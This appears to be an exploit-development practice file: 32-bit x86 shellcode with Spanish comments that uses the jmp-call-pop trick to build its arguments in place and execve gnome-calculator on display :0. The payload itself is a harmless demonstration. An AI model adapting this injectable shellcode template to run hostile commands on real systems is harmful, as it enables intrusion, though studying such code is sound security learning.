	section	.text
_shell_init:	
	jmp	_shellcd_db
_shellcd:	
	xor	eax,eax
	pop	ebx		; "gnome-calculatorABBBB[...]"
	mov	[ebx+25],al	; "gnome-calculator\0BBBB[...]"
	mov	[ebx+26],ebx	; "gnome-calculator\0"&"gnome-calculator\0CCCC
	mov	[ebx+30],eax	; CCCC = nullptr
	lea	edi,[ebx+42]	; ptr a DISPLAY=:0F
	mov	[ebx+34],edi	; DDDD = &"DISPLAY=:0F"
	mov	[ebx+38],eax	; EEEE = nullptr 
	mov	[ebx+52],al	; &"DISPLAY=:0\0"
	lea	ecx,[ebx+26]	; cargamos [ebx+26] como segundo argumento
	lea	edx,[ebx+34]	; cargamos [ebx+34] como tercer argumento
	mov	al,11		; execve
	int	0x80		; call
	xor	eax,eax
	mov	al,1
	xor	ebx,ebx
	int	0x80		; salida limpia
_shellcd_db:
	call	_shellcd
	db	"/usr/bin/gnome-calculatorABBBBCCCCDDDDEEEEDISPLAY=:0F"
